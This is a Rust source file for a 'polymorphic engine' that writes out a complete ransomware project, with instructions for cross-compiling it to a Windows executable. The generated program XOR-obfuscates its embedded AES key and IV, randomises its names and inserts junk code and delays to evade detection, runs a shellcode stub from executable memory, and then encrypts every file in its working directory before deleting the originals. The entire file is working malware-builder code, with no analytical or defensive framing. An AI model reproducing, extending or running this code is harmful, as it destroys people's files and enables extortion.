use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use std::fs::{self, File};
use std::io::{self, Write};
use hex;

struct PolyMorphEngine {
    output_dir: String,
}

impl PolyMorphEngine {
    fn new() -> Self {
        let rand_suffix: String = thread_rng()
            .sample_iter(&Alphanumeric)
            .take(8)
            .map(char::from)
            .collect();
        PolyMorphEngine {
            output_dir: format!("ransomware_{}", rand_suffix),
        }
    }

    fn name_thing(&self, prefix: &str) -> String {
        let rand_str: String = thread_rng()
            .sample_iter(&Alphanumeric)
            .take(12)
            .map(char::from)
            .collect();
        format!("{}_{}", prefix, rand_str)
    }

    fn gen_iv(&self) -> (Vec<u8>, Vec<u8>, u8) {
        let key: Vec<u8> = (0..32).map(|_| thread_rng().gen()).collect();
        let iv: Vec<u8> = (0..16).map(|_| thread_rng().gen()).collect();
        let xor_key = thread_rng().gen_range(1..255) as u8;
        (key, iv, xor_key)
    }

    fn iv_fuck(&self, data: &[u8], xor_key: u8) -> String {
        let encrypted: Vec<u8> = data.iter().map(|b| b ^ xor_key).collect();
        hex::encode(encrypted)
    }

    fn gen_junk_code(&self) -> String {
        let var1 = self.name_thing("j");
        let var2 = self.name_thing("k");
        let rand_num: i32 = thread_rng().gen_range(100..1000);
        format!(
            r#"let mut _{var1}: i32 = {rand_num}; let mut {var2}: i32 = ({rand_num} as i32).checked_mul(7).unwrap_or(0); for _ in 0..{limit} {{ _{var1} ^= {var2}; {var2} -= 2; std::thread::sleep(std::time::Duration::from_millis({delay})); }}"#,
            var1 = var1,
            var2 = var2,
            rand_num = rand_num,
            limit = rand_num / 3,
            delay = thread_rng().gen_range(10..100)
        )
    }

    fn memory_fuck(&self) -> (String, String) {
        let fn_name = self.name_thing("variant_in_memory");
        let code = format!(
            r#"fn {}() {{
                println!("Executing In-Memory variant...");
                unsafe {{
                    let payload: [u8; 12] = [0x90, 0x90, 0x48, 0x31, 0xC0, 0x48, 0xFF, 0xC0, 0xC3, 0x90, 0x90, 0x90];
                    let mem = VirtualAlloc(std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if !mem.is_null() {{
                        std::ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, payload.len());
                        let exec_fn: extern "C" fn() -> i32 = std::mem::transmute(mem);
                        exec_fn();
                    }}
                }}
            }}"#,
            fn_name
        );
        (fn_name, code)
    }

    fn gen_rw_src(&self) -> String {
        let key_fn = self.name_thing("k");
        let iv_fn = self.name_thing("i");
        let encrypt_fn = self.name_thing("e");
        let dir_var = self.name_thing("d");
        let state_var = self.name_thing("s");
        let variant_selector = self.name_thing("v");

        let (key, iv, xor_key) = self.gen_iv();
        let key_encrypted = self.iv_fuck(&key, xor_key);
        let iv_encrypted = self.iv_fuck(&iv, xor_key);

        let junk_code = self.gen_junk_code();
        let (variant_in_memory_name, variant_in_memory) = self.memory_fuck();

        let variant = 0;
        format!(
r#"
use aes::Aes256;
use aes::cipher::BlockEncryptMut;
use cbc::cipher::{{KeyIvInit}};
use aes::cipher::block_padding::Pkcs7;
use generic_array::GenericArray;
use std::fs;
use std::io;
use rand::thread_rng;
use rand::prelude::SliceRandom;
use rand::Rng;
use winapi::um::memoryapi::{{VirtualAlloc}};
use winapi::um::winnt::{{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE}};

fn {key_fn}() -> Vec<u8> {{
    let encrypted = hex::decode("{key_encrypted}").unwrap();
    let xor_key = {xor_key};
    encrypted.into_iter().map(|b| b ^ xor_key).collect()
}}

fn {iv_fn}() -> Vec<u8> {{
    let encrypted = hex::decode("{iv_encrypted}").unwrap();
    let xor_key = {xor_key};
    encrypted.into_iter().map(|b| b ^ xor_key).collect()
}}

{variant_in_memory}

fn {encrypt_fn}() -> std::io::Result<()> {{
    {junk_code}
    let {dir_var} = ".";
    let mut {state_var} = 0;
    let {variant_selector} = {variant};

    println!("selected: {{}}", {variant_selector});
    if {variant_selector} == 0 {{ {variant_in_memory_name}(); }}

    while {state_var} < 5 {{
        match {state_var} {{
            0 => {{ {junk_code} {state_var} += 1; }},
            1 => {{ {state_var} += 1; }},
            2 => {{
                let key = {key_fn}();
                let iv = {iv_fn}();
                let mut entries = fs::read_dir({dir_var})?.collect::<Vec<_>>();
                entries.shuffle(&mut thread_rng());
                for entry in entries {{
                    let entry = entry?;
                    let path = entry.path();
                    if path.is_file() && !path.to_str().unwrap().ends_with(".enc") {{
                        let mut data = fs::read(&path)?;
                        let data_len = data.len();
                        let cipher = cbc::Encryptor::<Aes256>::new(GenericArray::from_slice(&key), GenericArray::from_slice(&iv));
                        let encrypted = cipher.encrypt_padded_mut::<Pkcs7>(&mut data, data_len)
                            .map_err(|e| io::Error::new(io::ErrorKind::Other, "Padding error"))?;
                        let new_path = format!("{{}}.enc", path.to_str().unwrap());
                        fs::write(&new_path, encrypted)?;
                        fs::remove_file(path)?;
                        std::thread::sleep(std::time::Duration::from_millis(thread_rng().gen_range(50..500)));
                    }}
                }}
                {state_var} += 1;
            }},
            _ => {{ println!("[+] encrypted."); {state_var} += 1; }},
        }}
    }}
    Ok(())
}}

fn main() {{
    {junk_code}
    if let Err(e) = {encrypt_fn}() {{
        eprintln!("Error: {{}}", e);
    }}
}}
"#,
            key_fn = key_fn,
            iv_fn = iv_fn,
            encrypt_fn = encrypt_fn,
            dir_var = dir_var,
            state_var = state_var,
            variant_selector = variant_selector,
            key_encrypted = key_encrypted,
            iv_encrypted = iv_encrypted,
            xor_key = xor_key,
            variant_in_memory = variant_in_memory,
            junk_code = junk_code,
            variant = variant,
            variant_in_memory_name = variant_in_memory_name
        )
    }

    fn write_file(&self) -> io::Result<()> {
        fs::create_dir_all(&format!("{}/src", self.output_dir))?;
        
        let cargo_toml = format!(
r#"[package]
name = "{}"
version = "0.1.0"
edition = "2021"

[target.'cfg(windows)'.dependencies]
winapi = {{ version = "0.3", features = ["memoryapi", "winnt", "minwindef"] }}

[dependencies]
rand = "0.8"
aes = "0.8"
cbc = "0.1"
hex = "0.4"
generic-array = "0.14"
"#,
            self.output_dir
        );
        let mut cargo_file = File::create(&format!("{}/Cargo.toml", self.output_dir))?;
        cargo_file.write_all(cargo_toml.as_bytes())?;

        let code = self.gen_rw_src();
        let mut main_file = File::create(&format!("{}/src/main.rs", self.output_dir))?;
        main_file.write_all(code.as_bytes())?;

        println!("[+] generated'{}'", self.output_dir);
        println!("cross compiling:");
        println!("1. mingw is needed: sudo (repo here) install mingw-w64");
        println!("2. add the target: rustup target add x86_64-pc-windows-gnu");
        println!("3. cd {} && cargo build --release --target x86_64-pc-windows-gnu", self.output_dir);
        println!("output should look like: {}/target/x86_64-pc-windows-gnu/release/{}.exe", self.output_dir, self.output_dir);
        Ok(())
    }

    fn run(&self) -> io::Result<()> {
        self.write_file()?;
        Ok(())
    }
}

fn main() {
    let engine = PolyMorphEngine::new();
    if let Err(e) = engine.run() {
        eprintln!("Error: {}", e);
        std::process::exit(1);
    }
}
